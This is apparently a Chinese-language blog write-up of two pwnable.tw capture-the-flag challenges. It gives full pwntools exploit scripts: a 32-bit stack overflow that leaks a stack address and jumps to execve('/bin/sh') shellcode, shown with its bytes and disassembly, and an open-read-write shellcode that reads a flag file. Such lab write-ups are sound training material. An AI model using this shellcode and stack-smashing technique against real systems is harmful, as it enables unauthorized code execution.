# [PWNABLE.TW](https://pwnable.tw/challenge)

很早就有人和我推荐这个网站了，但是一直懒得写（

规则中有一句`Do not share entire solution code of high score challenges in public`。但是它没定义具体是多少分才能算“high score challenges”？我猜是400-500分的题。大可不必担心，我连150分的题能不能做出来都难说

## Start

竟然是32位程序，我都忘了该怎么做了（

checksec发现一个保护都没开，因此栈可执行。漏洞是栈溢出，返回entry打印栈上内容（0x08048087）的地方泄漏栈地址并跳转shellcode即可
```py
from pwn import *
p=remote("chall.pwnable.tw",10000)
p.sendafter("CTF:",b'a'*20+p32(0x08048087))
buf=u32(p.recv(4))+20
p.send(b'a'*20+p32(buf)+b"\x6A\x0B\x58\x53\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\x31\xD2\xCD\x80")
p.interactive()
```
shellcode内容如下：
```
push   0xb
pop    eax
push   ebx
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
xor ecx,ecx
xor edx,edx
int    0x80
```
(在 https://www.exploit-db.com/exploits/44321 抄的，需要自己补上清空ecx和edx的逻辑)

## orw

flag路径在规则里说过，直接pwntools秒了
```py
from pwn import *
p=remote("chall.pwnable.tw",10001)
p.sendlineafter(":",asm(shellcraft.open("/home/orw/flag")+shellcraft.read(3, 0x0804a060+300, 0x50)+shellcraft.write(1, 0x0804a060+300, 0x50)))
p.interactive()
```